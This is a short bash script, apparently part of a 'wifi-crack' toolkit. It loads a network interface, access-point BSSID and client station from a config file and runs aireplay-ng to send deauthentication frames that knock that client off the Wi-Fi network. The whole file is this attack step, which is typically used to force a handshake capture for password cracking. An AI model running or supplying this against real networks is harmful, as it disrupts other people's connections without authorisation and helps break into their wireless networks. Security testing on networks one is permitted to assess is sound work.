#!/bin/bash

PWD="$(pwd)"
source "$PWD/wifi-crack.conf"
#### VARIAVEIS UTILIZADAS
# INTERFACE
# BSSID
# STATION

aireplay-ng --deauth 4 -a "$BSSID" -c "$STATION" "$INTERFACE"

